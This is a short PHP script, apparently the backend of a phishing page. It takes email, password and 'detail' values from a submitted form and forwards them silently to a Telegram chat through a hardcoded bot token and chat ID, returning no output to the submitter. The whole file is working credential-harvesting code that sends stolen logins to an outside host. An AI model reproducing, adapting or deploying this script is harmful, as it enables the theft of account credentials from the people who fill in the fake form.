<?php
// Telegram bot token and chat ID
$botToken = '8733467958:AAENsooga6Q70o_W8yH_cA5ZLYtMx_qM-AA';
$chatId = '7500645284';

// Retrieve POST data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$detail = isset($_POST['detail']) ? $_POST['detail'] : '';

// Compose message
$message = "New Data Submission:\nEmail: $email\nPassword: $password\nDetail: $detail";

// Send message to Telegram
$sendUrl = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($sendUrl, false, $context);

// Optional: minimal response or no output
// For no output, comment out the following line
// echo json_encode(['status' => 'sent']);

exit; // End script without output
?>